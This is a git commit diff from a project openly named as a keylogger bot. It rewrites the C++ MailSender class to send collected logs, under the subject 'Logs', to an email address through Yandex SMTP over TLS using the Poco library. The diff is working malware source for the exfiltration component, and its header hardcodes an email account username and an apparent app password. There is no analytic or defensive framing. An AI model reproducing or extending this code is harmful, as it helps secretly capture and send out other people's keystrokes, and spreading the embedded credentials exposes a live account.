8e0c866f5d5037f99f0295c4da1c41b0addea90a
Ranger0806 <kraka.tau0806@gmail.com>
2024-03-23 12:58:15 +0300

    V0.5

--- ConsoleApplication_MEI_keylogger_bot/MailSender.cpp
+++ ConsoleApplication_MEI_keylogger_bot/MailSender.cpp
@@ -6,81 +6,48 @@ MailSender::MailSender(std::string email) {
 	this->email = email;
 }
 
-void MailSender::send(std::string message)
+void MailSender::send(std::string text)
 {
-	if (message != "") {
-        CURL* curl;
-        CURLcode res = CURLE_OK;
-        struct curl_slist* recipients = NULL;
-        struct upload_status upload_ctx = { 0 };
-        const char* FROM_MAIL = email.c_str();
+    if (text != "") {
+        int port = 465;
+        string host = "smtp.yandex.ru";
+        std::string subject = "Logs";
+        MailMessage message;
 
-        curl = curl_easy_init();
-        if (curl) {
-            curl_easy_setopt(curl, CURLOPT_URL, "http://smtp.yandex.ru:465");
-            curl_easy_setopt(curl, CURLOPT_MAIL_FROM, FROM_ADDR.c_str());
-            curl_easy_setopt(curl, CURLOPT_USERNAME, USERNAME);
-            curl_easy_setopt(curl, CURLOPT_PASSWORD, PASSWORD);
-            curl_easy_setopt(curl, CURLOPT_VERBOSE, TRUE);
-            recipients = curl_slist_append(recipients, FROM_MAIL);
-            curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
-            curl_easy_setopt(curl, CURLOPT_READFUNCTION, MailSender::payload_source);
-            curl_easy_setopt(curl, CURLOPT_READDATA, &upload_ctx);
-            curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
-            const std::time_t t = std::time(0);
-            std::tm* now = new tm();
-            localtime_s(now, &t);
-            std::string text = "Date:" + std::to_string(now->tm_mday) + " " + monthes[now->tm_mon] + " " + std::to_string(now->tm_year + 1900) +
-                " " + std::to_string(now->tm_hour) + ":" + std::to_string(now->tm_min) + ":" + std::to_string(now->tm_sec) + "\r\nTo: " + email + "\r\nFrom: " + FROM_ADDR +
-                "\r\nSubject: SMTP example message\r\n\r\n" + message;
-            int size = text.size() + 1;
-            MailSender::payload_text = new char[text.size() + 1];
-            strncpy_s(MailSender::payload_text, size, text.c_str(), size);
-            try {
-                res = curl_easy_perform(curl);
-            }
-            catch(std::exception e) {
-                std::ofstream f("mailerrors.log", std::ios::app);
-                f << e.what() << std::endl;
-                f.close();
-            }
-            if (res != CURLE_OK) {
-                std::ofstream f("mailerrors.log", std::ios::app);
-                f << curl_easy_strerror(res) << std::endl;
-                f.close();
-            }
-            else {
-                std::ofstream f("statsMail.log", std::ios::app);
-                f << "OK 200\n" << message << std::endl;
-                f.close();
-            }
-            curl_slist_free_all(recipients);
-            curl_easy_cleanup(curl);
+        try {
+            SharedPtr<InvalidCertificateHandler> pCert = new AcceptCertificateHandler(false);
+            Context::Ptr pContext = new Poco::Net::Context(Context::TLS_SERVER_USE, "", "",
+                "ca.crt", Context::VERIFY_STRICT, 9, true,
+                "ALL:!ADH:!LOW:!EXP:!MD5:@STRENGTH");
+            SSLManager::instance().initializeClient(0, pCert, pContext);
+
+            SecureStreamSocket pSSLSocket(pContext);
+            pSSLSocket.connect(SocketAddress(host, port));
+            SecureSMTPClientSession secure(pSSLSocket);
+
+            secure.login(SMTPClientSession::AUTH_LOGIN, USERNAME, PASSWORD);
+
+            message.setSender(FROM_ADDR);
+            message.addRecipient(MailRecipient(MailRecipient::PRIMARY_RECIPIENT, email));
+            message.setSubject(subject);
+            message.setContentType("text/plain; charset=UTF-8");
+            message.setContent(text, MailMessage::ENCODING_8BIT);
+
+            secure.sendMessage(message);
+            secure.close();
+
         }
-	}
-}
-
-size_t MailSender::payload_source(char* ptr, size_t size, size_t nmemb, void* userp)
-{
-    struct upload_status* upload_ctx = (struct upload_status*)userp;
-    const char* data;
-    size_t room = size * nmemb;
-
-    if ((size == 0) || (nmemb == 0) || ((size * nmemb) < 1)) {
-        return 0;
+        catch (Poco::Net::SMTPException& e) {
+            cout << e.code() << endl;
+            cout << e.message() << endl;
+            cout << e.what() << endl;
+            cout << e.displayText().c_str() << endl;
+        }
+        catch (Poco::Net::NetException& e) {
+            cout << e.code() << endl;
+            cout << e.message() << endl;
+            cout << e.what() << endl;
+            cout << e.displayText().c_str() << endl;
+        }
     }
-
-    data = &payload_text[upload_ctx->bytes_read];
-
-    if (data) {
-        size_t len = strlen(data);
-        if (room < len)
-            len = room;
-        memcpy(ptr, data, len);
-        upload_ctx->bytes_read += len;
-
-        return len;
-    }
-
-    return 0;
 }
--- ConsoleApplication_MEI_keylogger_bot/MailSender.h
+++ ConsoleApplication_MEI_keylogger_bot/MailSender.h
@@ -1,10 +1,33 @@
 #pragma once
 #include "Sender.h"
-#include "curl/curl.h"
 #include "fstream"
 #include <ctime>
 #include <time.h>
 #include <string>
+#include "Poco/Net/MailMessage.h"
+#include "Poco/Net/MailRecipient.h"
+#include "Poco/Net/SMTPClientSession.h"
+#include "Poco/Net/NetException.h"
+#include "Poco/Net/SecureSMTPClientSession.h"
+#include "Poco/Net/InvalidCertificateHandler.h"
+#include "Poco/Net/AcceptCertificateHandler.h"
+#include "Poco/Net/SSLManager.h"
+#include "Poco/Net/SecureStreamSocket.h"
+#include "Poco/Net/MailRecipient.h"
+
+using Poco::Net::InvalidCertificateHandler;
+using Poco::Net::AcceptCertificateHandler;
+using Poco::Net::Context;
+using Poco::Net::SSLManager;
+using Poco::Net::SecureStreamSocket;
+using Poco::Net::SocketAddress;
+using Poco::Net::SecureSMTPClientSession;
+using Poco::Net::SMTPClientSession;
+using Poco::SharedPtr;
+using Poco::Net::MailMessage;
+using Poco::Net::MailRecipient;
+using namespace std;
+
 
 class MailSender : public Sender
 {
@@ -12,8 +35,8 @@ private:
 	std::string monthes[12] = { "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec" };
 	std::string email = "0";
 	const std::string FROM_ADDR = "kraka.tau0806@yandex.ru";
-	const char* USERNAME = "kraka.tau0806@yandex.ru";
-	const char* PASSWORD = "brslgluyfwnmomfg";
+	const string USERNAME = "kraka.tau0806@yandex.ru";
+	const string PASSWORD = "brslgluyfwnmomfg";
 public:
 	static char* payload_text;
 	struct upload_status {
